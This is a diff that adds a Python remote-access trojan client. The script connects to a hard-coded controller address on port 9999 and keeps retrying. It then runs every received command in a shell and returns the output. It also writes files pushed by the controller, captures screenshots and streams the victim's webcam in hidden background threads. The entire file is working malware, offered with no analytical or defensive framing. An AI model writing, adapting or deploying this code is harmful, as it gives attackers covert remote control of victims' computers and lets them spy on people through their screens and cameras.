@@ -1,0 +1,115 @@
+import socket
+import subprocess
+import time
+import threading
+import pyautogui
+import cv2
+import numpy as np
+import json
+import os
+import ctypes
+
+# Constants
+HOST = '192.168.56.1'
+PORT = 9999
+BUFFER_SIZE = 1024
+
+# Create socket connection
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def reliable_send(data):
+    """Send data reliably, ensuring it's fully transmitted"""
+    jsondata = json.dumps(data)
+    s.send(jsondata.encode())
+
+def reliable_recv():
+    """Receive data reliably, handling incomplete or partial messages"""
+    data = ""
+    while True:
+        try:
+            data += s.recv(BUFFER_SIZE).decode().rstrip()
+            return json.loads(data)
+        except ValueError:
+            continue
+
+def download_file(file_name):
+    """Download a file from the server"""
+    with open(file_name, "wb") as f:
+        s.settimeout(1)
+        chunk = s.recv(BUFFER_SIZE)
+        while chunk:
+            f.write(chunk)
+            try:
+                chunk = s.recv(BUFFER_SIZE)
+            except socket.timeout:
+                break
+        s.settimeout(None)
+
+def upload_file(file_name):
+    """Upload a file to the server"""
+    with open(file_name, "rb") as f:
+        s.send(f.read())
+
+def screenshot():
+    """Capture a screenshot"""
+    image = pyautogui.screenshot()
+    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
+    cv2.imwrite("screenshot.png", image)
+
+def reverse_shell():
+    """Handles reverse shell communication"""
+    while True:
+        command = reliable_recv()
+        if command == "quit":
+            break
+        elif command == "screenshot":
+            threading.Thread(target=screenshot_reverse_shell, daemon=True).start()
+        elif command == "camera":
+            threading.Thread(target=camera_reverse_shell, daemon=True).start()
+        elif command[:6] == "upload":
+            download_file(command[7:])
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            reliable_send(result.decode())
+
+def camera_reverse_shell():
+    """Capture and stream video from the camera"""
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        s.sendall(b"[!] Failed to access camera")
+        return
+    while True:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        send_frame(frame)
+        time.sleep(0.05)
+    cap.release()
+
+def send_frame(frame):
+    """Send a frame over the network"""
+    _, img_encoded = cv2.imencode('.jpg', frame)
+    img_bytes = img_encoded.tobytes()
+    s.sendall(len(img_bytes).to_bytes(4, 'big'))
+    s.sendall(img_bytes)
+
+def screenshot_reverse_shell():
+    """Capture and send a screenshot"""
+    screenshot = pyautogui.screenshot()
+    frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
+    send_frame(frame)
+
+def connection():
+    """Attempt to connect to the server and initiate reverse shell"""
+    while True:
+        time.sleep(5)
+        try:
+            s.connect((HOST, PORT))
+            reverse_shell()
+            s.close()
+        except:
+            continue
+
+if __name__ == "__main__":
+    connection()
